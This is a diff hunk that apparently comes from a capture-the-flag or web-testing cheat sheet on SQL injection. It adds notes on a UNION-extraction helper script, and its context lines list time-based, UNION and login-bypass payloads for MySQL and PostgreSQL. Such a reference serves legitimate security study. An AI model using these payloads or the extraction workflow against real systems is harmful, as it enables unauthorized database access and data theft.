@@ -49,6 +49,14 @@ time     MySQL ' AND SLEEP(5)-- -  |  PostgreSQL ' AND pg_sleep(5)-- -
 union    ' ORDER BY N-- -  raising N until it errors, then ' UNION SELECT NULL,...-- -
 ```
 
+Once `--order-by N` names the column count, `tools/web/sqli_union.py`
+takes the two mechanical steps: `--cols N find` fires a marker per
+position to learn which column renders into the page, then
+`--pos K --expr 'SQL'` wraps the expression in `concat(0x7e,...,0x7e)`
+and regex-extracts the tilde-delimited value — `version()`,
+`group_concat(table_name)`, the flag column. Prefix/suffix overridable
+for non-MySQL dialects (the note says so when nothing extracts).
+
 Login bypass is worth trying first when the sink is an authentication query:
 `' OR '1'='1'-- -`, `admin'-- -`, `admin'#`, `') OR ('1'='1`.
 
